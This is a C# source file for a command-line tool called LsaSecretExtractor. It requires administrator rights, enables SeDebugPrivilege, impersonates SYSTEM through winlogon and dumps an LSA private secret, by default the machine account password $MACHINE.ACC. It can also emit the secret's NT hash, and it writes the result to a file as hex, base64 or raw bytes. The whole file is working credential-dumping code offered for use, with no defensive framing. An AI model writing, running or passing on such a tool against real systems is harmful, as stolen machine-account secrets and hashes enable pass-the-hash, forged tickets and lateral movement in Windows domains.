using System;
using System.IO;
using FindGT;

namespace LsaSecretExtractor
{
    internal static class Program
    {
        private static int Main(string[] args)
        {
            string outPath = null;
            string encoding = "hex";
            string secretName = "$MACHINE.ACC";
            bool ntHash = false;
            bool selfTest = false;
            bool showHelp = false;

            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i].ToLowerInvariant())
                {
                    case "--out":
                    case "-o":
                        outPath = (i + 1 < args.Length) ? args[++i] : null;
                        break;
                    case "--encoding":
                    case "-e":
                        encoding = (i + 1 < args.Length) ? args[++i].ToLowerInvariant() : encoding;
                        break;
                    case "--secret":
                    case "-s":
                        secretName = (i + 1 < args.Length) ? args[++i] : secretName;
                        break;
                    case "--nthash":
                        ntHash = true;
                        break;
                    case "--selftest":
                        selfTest = true;
                        break;
                    case "--help":
                    case "-h":
                    case "/?":
                        showHelp = true;
                        break;
                }
            }

            if (showHelp)
            {
                PrintUsage();
                return 0;
            }

            if (selfTest)
            {
                return RunSelfTest() ? 0 : 3;
            }

            if (string.IsNullOrEmpty(outPath))
            {
                Console.Error.WriteLine("[!] Missing required argument: --out <path>");
                PrintUsage();
                return 1;
            }

            if (encoding != "hex" && encoding != "base64" && encoding != "raw")
            {
                Console.Error.WriteLine("[!] Invalid --encoding '" + encoding + "'. Use hex|base64|raw.");
                return 1;
            }

            if (!SystemImpersonation.IsAdministrator())
            {
                Console.Error.WriteLine("[!] This tool must run elevated (administrator).");
                return 2;
            }

            SystemImpersonation.EnableSeDebugPrivilege();

            if (!SystemImpersonation.ImpersonateSystem())
            {
                Console.Error.WriteLine("[!] Failed to impersonate SYSTEM (winlogon). Are you elevated?");
                return 2;
            }

            byte[] secret = null;
            try
            {
                secret = LsaCrypto.GetSecretPlaintext(secretName);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[!] Failed to read LSA secret '" + secretName + "': " + ex.Message);
                return 4;
            }
            finally
            {
                SystemImpersonation.Revert();
            }

            if (secret == null || secret.Length == 0)
            {
                Console.Error.WriteLine("[!] LSA secret '" + secretName + "' is empty or not present.");
                return 4;
            }

            int rawLength = secret.Length;
            byte[] outputBytes = ntHash ? Md4.Hash(secret) : secret;

            try
            {
                WriteOutput(outPath, outputBytes, encoding);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[!] Failed to write '" + outPath + "': " + ex.Message);
                return 5;
            }
            finally
            {
                Array.Clear(secret, 0, secret.Length);
            }

            // Never print the secret material itself (plaintext or NT hash).
            Console.WriteLine("[+] Secret '" + secretName + "' retrieved (" + rawLength + " bytes" +
                              (ntHash ? ", emitted as 16-byte NTOWFv1" : "") + ").");
            Console.WriteLine("[+] Wrote " + encoding + " to: " + Path.GetFullPath(outPath));
            return 0;
        }

        private static void WriteOutput(string path, byte[] data, string encoding)
        {
            switch (encoding)
            {
                case "raw":
                    File.WriteAllBytes(path, data);
                    break;
                case "base64":
                    File.WriteAllText(path, Convert.ToBase64String(data));
                    break;
                default:
                    File.WriteAllText(path, ToHex(data));
                    break;
            }
        }

        private static string ToHex(byte[] data)
        {
            var sb = new System.Text.StringBuilder(data.Length * 2);
            foreach (byte b in data)
                sb.Append(b.ToString("x2"));
            return sb.ToString();
        }

        private static bool RunSelfTest()
        {
            bool ok = true;
            ok &= CheckMd4("", "31d6cfe0d16ae931b73c59d7e0c089c0");
            ok &= CheckMd4("abc", "a448017aaf21d8525fc10ae87aa6729d");
            Console.WriteLine(ok ? "[+] Self-test PASSED" : "[!] Self-test FAILED");
            return ok;
        }

        private static bool CheckMd4(string ascii, string expected)
        {
            string got = ToHex(Md4.Hash(System.Text.Encoding.ASCII.GetBytes(ascii)));
            bool ok = string.Equals(got, expected, StringComparison.OrdinalIgnoreCase);
            Console.WriteLine("    MD4(\"" + ascii + "\") = " + got + (ok ? "  OK" : "  EXPECTED " + expected));
            return ok;
        }

        private static void PrintUsage()
        {
            Console.WriteLine("LsaSecretExtractor — dumps an LSA private secret (default $MACHINE.ACC) to a file.");
            Console.WriteLine();
            Console.WriteLine("Usage: LsaSecretExtractor.exe --out <path> [--encoding hex|base64|raw] [--secret <name>] [--nthash]");
            Console.WriteLine();
            Console.WriteLine("  --out, -o <path>      Output file path (required).");
            Console.WriteLine("  --encoding, -e <enc>  hex (default) | base64 | raw.");
            Console.WriteLine("  --secret, -s <name>   LSA secret name (default: $MACHINE.ACC).");
            Console.WriteLine("  --nthash              Emit MD4(secret) (16-byte NTOWFv1) instead of the raw secret.");
            Console.WriteLine("  --selftest            Run MD4 test vectors and exit.");
            Console.WriteLine("  --help, -h            Show this help.");
            Console.WriteLine();
            Console.WriteLine("Must run elevated (administrator). The tool impersonates SYSTEM to read the secret.");
        }
    }
}
